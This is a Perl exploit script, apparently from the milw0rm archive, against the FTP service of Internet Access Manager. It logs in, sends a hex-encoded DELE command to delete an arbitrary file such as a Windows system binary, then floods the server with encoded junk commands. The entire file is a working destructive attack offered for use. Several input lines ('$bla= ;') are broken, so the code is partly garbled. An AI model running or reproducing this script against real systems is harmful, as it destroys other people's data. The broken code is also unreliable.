#!usr/bin/perl
#
#   FTP Internet Access Manager Command Exploit
# ----------------------------------------------
#      Infam0us Gr0up - Securiti Research
#
# Info: infamous.2hell.com
# Vendor URL: www.softfolder.com/internet_access_manager.html
# 

use IO::Socket;

if (@ARGV != 4) 
{ 
print "\n FTP Internet Access Manager Command Exploit\n";
print "---------------------------------------------\n\n";
print "[!] usage: perl $0 [host] [user] [pass] [*file]\n";
print "[?] exam: perl $0 localhost admin 123 C:\\WINNT\\system32\\command.exe\n";
print "*Only at dir Internet Access Manager was installed that user can delete\nany files type(e.g C:\\)\n\n"; 
exit ();
} 

$adr = $ARGV[0];
$user = $ARGV[1];
$pass = $ARGV[2];
$flz = $ARGV[3];

print "\n[+] Connect to $adr..\n";
$remote = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$adr,
PeerPort=>21, Reuse=>1) or die "Error: can't connect to $adr:21\n";

$chr1 = "\x55\x53\x45\x52";
$chr2 = "\x50\x41\x53\x53";

$dll = "\x44\x45\x4c\x45";
$tou = "\x70\x6f\x72\x74";
$bel = "\x32\x31";

$cowflaw = $tou.$bel;

$tmp = "\x53\x54\x4f\x55";
$chop = "\x4f\x56\x45\x52";

print "[+] Connected\n";
$remote->autoflush(1);
print "[+] FTP Server ..ready\n";

print $remote "$chr1 $user\n" and print "[+] Send -> USER $user...\n" or die
"[-] Error: can't send user\n";
sleep(1);
print $remote "$chr2 $pass\n" and print "[+] Send -> PASS $pass...\n" or die
"[-] Error: can't send pass\n";
sleep(2);
print "[+] User admin logged in\n";
print "[+] Press[enter] to DELETE $flz\n";
$bla= ;
print $remote "$dll /$flz\n";
sleep(2);
print "[+] Success\n";
sleep(1);
print "[+] Sending trash mount..\n";
sleep(1);
print $remote "$cowflaw\n";
print $remote "$tmp\n";
print "[+] Trashing folder[1]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[2]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[3]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[4]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[5]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[6]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[7]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[8]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[9]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[10]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[11]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[12]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[13]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[14]..\n";
print $remote "$tmp\n";
print "[+] Trashing folder[15]..\n";
print $remote "$tmp\n";
sleep(2);
print "[+] DONE\n\n";
print $remote "$chop\n";  
print "W00t.FTP Flawned!\n";
print "..press any key to exit\n";
$bla= ;
close $remote;

# milw0rm.com [2005-09-07]
